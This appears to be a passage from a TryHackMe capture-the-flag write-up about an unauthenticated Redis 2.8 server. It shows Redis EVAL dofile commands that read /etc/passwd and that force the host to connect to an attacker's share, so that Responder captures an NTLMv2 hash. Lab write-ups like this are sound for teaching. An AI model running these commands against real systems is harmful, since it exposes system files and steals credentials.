https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme/vulnnetactive.md

The Redis instance was running version 2.8, and did not require authentication. It contained no keys of note. However, this version of Redis contains a 'vulnerability' where you can use 'dofile' in the LUA sandbox, allowing you to access files or network shares. E.g. EVAL "dofile('/etc/passwd')" 0 would work on a linux machine.
For a windows machine, notably, this can be used to access network shares. Which means, if I set up responder, I might be able to catch a hash.

Setting up responder from this repo (the new version, 3.0+, not the kali default version), https://github.com/lgandx/Responder, then using something like EVAL "dofile('//yourip//share')" 0 will catch an NTMLv2 hash.
